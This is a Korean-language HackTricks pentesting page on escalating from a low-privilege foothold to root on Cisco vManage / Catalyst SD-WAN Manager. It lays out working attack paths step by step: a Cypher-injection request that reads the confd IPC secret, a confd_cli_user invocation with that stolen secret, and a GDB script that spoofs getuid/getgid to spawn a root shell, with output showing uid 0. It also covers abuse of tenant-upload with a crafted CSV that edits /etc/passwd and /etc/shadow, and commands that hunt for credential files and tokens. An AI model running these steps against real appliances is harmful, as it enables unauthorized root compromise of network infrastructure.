# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager*에서 `vmanage`, `netadmin` 또는 `vmanage-admin`으로 code execution을 확보한 경우, 가장 주목할 만한 local privilege escalation 공격 표면은 일반적으로 `confd` CLI stack, `cmdptywrapper` helper, localhost REST API, 그리고 root가 소유한 import/upload handler입니다.

controller에서 여전히 **initial foothold**가 필요한 경우, 먼저 전용 control-plane 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## 빠른 local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
If `/etc/confd/confd_ipc_secret`를 foothold에서 읽을 수 있다면, Path 1과 Path 2를 즉시 실용적으로 사용할 수 있습니다. remote info leak 또는 webshell을 통해 접근했다면, 이미 `vmanage-admin` SSH material 또는 multitenancy upload handler에 접근할 수 있는지도 확인하세요. 2026년 research에서는 두 가지 모두 현실적인 stepping stone인 것으로 나타났습니다.

## Path 1

([https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)의 예시)<sup>[[5]](#references)</sup>

`confd` 및 여러 binary와 관련된 [documentation](http://66.218.245.39/doc/html/rn03re18.html)을 조금 더 조사한 후(Cisco website의 account로 접근 가능), IPC socket을 authenticate하기 위해 `/etc/confd/confd_ipc_secret`에 있는 secret을 사용한다는 사실을 확인했습니다:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
우리의 Neo4j 인스턴스를 기억하는가? 이는 `vmanage` 사용자의 권한으로 실행 중이므로, 이전 취약점을 사용해 파일을 가져올 수 있다:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 프로그램은 명령줄 인자를 지원하지 않지만, 인자를 사용해 `/usr/bin/confd_cli_user`를 호출합니다. 따라서 자체 인자 집합을 사용해 `/usr/bin/confd_cli_user`를 직접 호출할 수 있습니다. 하지만 현재 권한으로는 해당 파일을 읽을 수 없으므로, rootfs에서 파일을 가져와 scp로 복사한 뒤 help를 확인하고 이를 사용해 shell을 획득해야 합니다:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 경로 2

(예시: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))<sup>[[6]](#references)</sup>

synacktiv 팀의 blog<sup>[[5]](#references)</sup>에서는 root shell을 얻는 우아한 방법을 설명했지만, `/usr/bin/confd_cli_user`의 복사본을 확보해야 한다는 단점이 있습니다. 이 파일은 root만 읽을 수 있습니다. 저는 이러한 번거로움 없이 root로 escalate하는 또 다른 방법을 찾았습니다.

`/usr/bin/confd_cli` binary를 disassemble했을 때 다음 내용을 확인했습니다.

<details>
<summary>UID/GID 수집을 보여주는 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux”를 실행했을 때 다음을 확인했습니다(_-g 100 -u 107_).
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
“confd_cli” 프로그램이 로그인한 사용자로부터 수집한 사용자 ID와 그룹 ID를 “cmdptywrapper” 애플리케이션에 전달한다고 추측했습니다.

첫 번째 시도는 “cmdptywrapper”를 직접 실행하고 `-g 0 -u 0`을 제공하는 것이었지만 실패했습니다. 그 과정에서 파일 디스크립터(-i 1015)가 어딘가에서 생성된 것으로 보이며, 이를 위조할 수 없습니다.

synacktiv의 블로그(마지막 예제)에서 언급했듯이, `confd_cli` 프로그램은 command line argument를 지원하지 않지만 debugger를 사용해 제어할 수 있으며, 다행히도 시스템에 GDB가 포함되어 있습니다.

API `getuid`와 `getgid`가 0을 반환하도록 강제하는 GDB script를 작성했습니다. Deserialization RCE를 통해 이미 “vmanage” privilege를 보유하고 있으므로 `/etc/confd/confd_ipc_secret`을 직접 읽을 권한이 있습니다.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console 출력:

<details>
<summary>콘솔 출력</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco는 이후 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)에 대한 자체 advisory에서 더 깔끔한 로컬 root 경로를 문서화했습니다. **read-only 권한만 가진 authenticated attacker**가 crafted request를 manager CLI로 전송하면, 불충분한 input validation으로 인해 root 권한을 획득할 수 있었습니다.<sup>[[7]](#references)</sup>

Offensive 관점에서 중요한 핵심은 다음과 같습니다.

1. 장비에서 *어떤 형태로든* low-priv foothold를 확보했다면, 더 복잡한 Path 1 / Path 2 workflow를 시도하기 전에 로컬 CLI 서비스를 테스트해야 합니다.
2. Path 2의 artifacts를 재사용하여 trust boundary를 확인합니다: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend로 전달되는 모든 field를 의심해야 합니다. UID/GID, username, terminal metadata, imported files 또는 이후 root-owned helper가 사용하는 모든 값이 대상입니다.
4. low-priv 사용자가 로컬 CLI socket에 접근하여 해당 field를 제어할 수 있다면, root 권한은 crafted request 하나만으로 획득할 수 있습니다.

appliance에 진입한 후의 실용적인 workflow는 다음과 같습니다:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
이로 인해 2025년 bug는 유사한 버전을 찾을 때 유용한 hunting pattern이 됩니다. **userland에서 identity를 수집한 뒤 더 높은 권한의 wrapper로 전달하는 local CLI shims**를 찾으세요.

**CVE-2025-20122**를 이후에 나온 **CVE-2026-20122**와 혼동하지 마세요. 2025년 issue는 *local* CLI-to-root bug인 반면, 2026년 issue는 주로 foothold를 심은 다음 Path 1 / Path 2 / Path 4를 다시 검토하는 데 유용한 *remote* API arbitrary file overwrite입니다.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco의 2026년 2월 advisory는 또 다른 유용한 privesc class인 [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)도 소개했습니다. 이 취약점은 REST API의 불충분한 user-authentication mechanism으로 인해 **authenticated local attacker with low privileges**가 root 권한을 얻을 수 있도록 했습니다.<sup>[[1]](#references)</sup>

이는 vManage privesc가 더 이상 `confd`/TTY abuse에만 국한되지 않음을 의미합니다. low-priv shell을 확보한 후에는 다음 항목도 hunt하세요.

- caller를 지나치게 신뢰하는 localhost-only API endpoints
- 현재 account에서 읽을 수 있는 tokens, cookies 또는 service credentials
- `dataservice`/REST handlers를 통해 노출되었으며 여전히 local하게 trigger할 수 있는 root-only actions

실제로 `vmanage` 또는 다른 service user로 shell을 확보하면, local API abuse는 interactive CLI abuse보다 더 조용하고 자동화하기 쉬운 경우가 많습니다.
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
로컬 session context만으로 privileged REST functionality에 접근할 수 있다면 API 경로를 우선하세요. 재생하고 script화하기 쉬우며, 탈취한 web session이나 API token과 chain하기도 쉽습니다.

## 경로 5 (2026 crafted file이 root에 의해 처리됨 - CVE-2026-20245)

또 다른 최근 pattern은 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)입니다. `netadmin` privileges를 가진 local attacker가 **crafted file**을 upload하면 CLI가 이후 이를 안전하지 않게 처리하여 `root` 권한으로 command injection이 발생할 수 있습니다.<sup>[[2]](#references)</sup>

HackTricks 관점에서 중요한 technique은 특정 CVE보다 더 광범위합니다.

1. file을 허용하는 모든 CLI 또는 web workflow를 열거합니다: imports, diagnostic bundles, templates, validators, backups, tenant data 등.
2. uploaded file이 저장되는 위치와 이를 소비하는 root-owned script 또는 binary를 추적합니다.
3. filename, file content 또는 parsed metadata가 shell commands, wrapper scripts 또는 `system()`-style helpers에 전달되는지 확인합니다.
4. 이미 `netadmin`에 접근할 수 있다면(valid creds, stolen session 또는 auth-bypass chain), file-processing bugs가 root로 가는 가장 빠른 경로인 경우가 많습니다.

이후 Google Cloud / Mandiant는 multitenancy import 경로를 통해 이 bug class가 exploit된 매우 구체적인 사례를 공개했습니다.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
관찰된 공격에서 조작된 CSV는 `/etc/passwd`와 `/etc/shadow`를 수정하여 임시 UID 0 계정(`troot`)을 생성했습니다.<sup>[[4]](#references)</sup> 따라서 `tenant-upload` / `tenant-list` 방식의 importer는 특히 주의해서 살펴볼 필요가 있습니다. 이는 단순한 data-ingestion 기능이 아니라, 잠재적으로 root 소유 parser front-end이기 때문입니다.

빠르게 확인할 때 사용할 수 있는 shell 측 hunting 패턴은 다음과 같습니다:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
이 버그 클래스는 `root`가 아닌 `netadmin` 권한을 부여하는 remote foothold와 특히 잘 연계됩니다.

## 연계에 유용한 최근 vManage/Catalyst SD-WAN Manager 취약점

- **인증 없는 info leak (CVE-2026-20133)** – 공개된 연구에 따르면 `confd_ipc_secret` 또는 `vmanage-admin` private key가 노출될 수 있어 특히 가치가 높습니다. 이를 통해 read bug를 Path 1 또는 NETCONF pivot으로 전환할 수 있습니다.<sup>[[3]](#references)</sup>
- **인증된 API 임의 파일 덮어쓰기 (CVE-2026-20122)** – 위의 2025 CLI bug와는 다릅니다. VulnCheck는 이를 이용해 webshell을 업로드했으며, 이후 이 페이지의 local privesc 경로가 즉시 중요해집니다.<sup>[[3]](#references)</sup>
- **인증된 UI XSS (CVE-2024-20475)** – web UI에서 admin session을 탈취한 다음, 결국 `vshell` 또는 위의 local privesc 경로에 도달하는 API/CLI 작업으로 pivot할 수 있습니다.
- **remote auth bypass를 통한 `netadmin` 획득 (CVE-2026-20129)** – 2026 crafted-file privesc에 정확히 필요한 권한 수준이 `netadmin`이므로 Path 5의 매우 강력한 precursor입니다.<sup>[[3]](#references)</sup>
- **인증된 임의 파일 쓰기 (CVE-2026-20262)** – 이후 web UI upload 경로를 통한 CVE-2026-20122와 유사한 offensive value를 가집니다. root 또는 management-plane web tier가 나중에 parse할 위치에 파일을 쓸 수 있습니다.
- **downgrade를 통한 구형 CLI privesc 부활 (CVE-2022-20775)** – 2026년 침해 사례에서 공격자들이 구형의 취약한 SD-WAN build로 rollback한 뒤, 기존 CLI root bug를 악용하고 원래 버전을 복원할 수 있음이 확인되었습니다.<sup>[[8]](#references)</sup>
- **사전 인증 control-plane auth bypass (CVE-2026-20182)** – 전용 SD-WAN control-plane 페이지에 더 자세히 설명되어 있습니다. 이 취약점을 이용하면 `vmanage-admin`의 SSH key를 추가할 수 있어, 이 페이지를 다시 확인하는 데 필요한 local foothold를 확보할 수 있습니다.



## 참고 자료

- [1] [Cisco Catalyst SD-WAN 취약점 (CVE-2026-20126, CVE-2026-20129 등)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager 및 Catalyst SD-WAN Validator 인증된 권한 상승 취약점 (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - 최근 Cisco SD-WAN Manager 취약점](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager의 취약점(CVE-2026-20245) Zero-Day Exploitation](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Cisco SD-WAN Pentesting Part 1: vManage 공격](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Cisco SD-WAN vManage 19.2.2 Hacking — CSRF에서 Remote Code Execution까지](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager 권한 상승 취약점 (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616의 Cisco Catalyst SD-WAN Active Exploitation (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
